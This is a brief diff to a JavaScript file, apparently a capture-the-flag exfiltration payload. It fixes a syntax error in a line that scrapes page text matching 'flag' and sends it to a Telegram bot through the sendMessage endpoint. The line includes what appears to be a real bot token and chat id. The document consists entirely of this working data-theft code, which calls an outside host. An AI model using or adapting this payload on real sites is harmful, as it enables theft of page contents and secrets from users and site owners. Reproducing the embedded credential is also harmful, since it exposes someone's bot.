@@ -6,4 +6,4 @@ function httpGet(theUrl)
     return xmlHttp.responseText;
 }
 
-httpGet("https://api.telegram.org/bot5845735007:AAHwoqGS8hjRbl8Qx5TsY9ZgnhoglvW6Iks/sendMessage?chat_id=439546457&text=" + (document.body.textContent..match(/flag.+/g).join("\n") || "fail"));
+httpGet("https://api.telegram.org/bot5845735007:AAHwoqGS8hjRbl8Qx5TsY9ZgnhoglvW6Iks/sendMessage?chat_id=439546457&text=" + (document.body.textContent.match(/flag.+/g).join("\n") || "fail"));
